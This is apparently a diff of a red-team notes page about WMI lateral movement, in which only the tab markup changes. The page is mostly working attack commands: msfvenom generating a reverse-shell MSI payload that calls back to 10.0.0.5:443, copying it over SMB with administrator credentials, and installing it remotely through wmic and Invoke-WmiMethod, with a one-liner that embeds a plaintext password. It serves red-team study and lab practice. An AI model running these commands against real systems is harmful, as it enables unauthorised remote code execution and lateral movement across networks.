@@ -8,49 +8,49 @@ description: WMI lateral movement with .msi packages
 
 Generating malicious payload in MSI \(Microsoft Installer Package\):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil64.msi
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)
 
 I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@remote" %}
+{% tabs %}
+{% tab title="attacker@remote" %}
 ```csharp
 wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLocation='\\10.0.0.2\c$\experiments\evil64.msi'
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)
 
 I had to revert to a filthy way of achieving the goal:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@remote" %}
+{% tabs %}
+{% tab title="attacker@remote" %}
 ```csharp
 net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.msi \\10.0.0.7\c$\PerfLogs\setup.msi ; wmic /node:10.0.0.7 /user:administrator@offense product call install PackageLocation=c:\PerfLogs\setup.msi
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/peek-2018-10-19-18-41.gif)
 
 Additionally, the same could of be achieved using powershell cmdlets:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@remote" %}
+{% tabs %}
+{% tab title="attacker@remote" %}
 ```csharp
 Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential (Get-Credential)
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Get a prompt for credentials:
 
@@ -62,13 +62,13 @@ and enjoy the code execution:
 
 Or if no GUI is available for credentials, a oneliner:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@remote" %}
+{% tabs %}
+{% tab title="attacker@remote" %}
 ```csharp
 $username = 'Administrator';$password = '123456';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential $credential
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-10-19-19-09-42.png)
 
